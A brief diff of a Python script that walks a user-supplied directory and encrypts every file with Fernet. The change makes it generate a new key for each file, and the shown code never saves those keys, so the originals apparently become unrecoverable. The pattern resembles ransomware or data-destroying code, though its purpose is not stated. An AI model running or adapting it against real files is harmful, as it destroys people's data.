@@ -7,7 +7,6 @@ t_dir = input()
 
 temp_files = []
 files = []
-key = Fernet.generate_key()
 
 for i in os.walk(t_dir):
     temp_files.append(list(i))
@@ -39,4 +38,5 @@ def enc_file(tfile,ekey):
         encrypted_file.write(encrypted)
 
 for i in files:
+    key = Fernet.generate_key()
     enc_file(i,key)
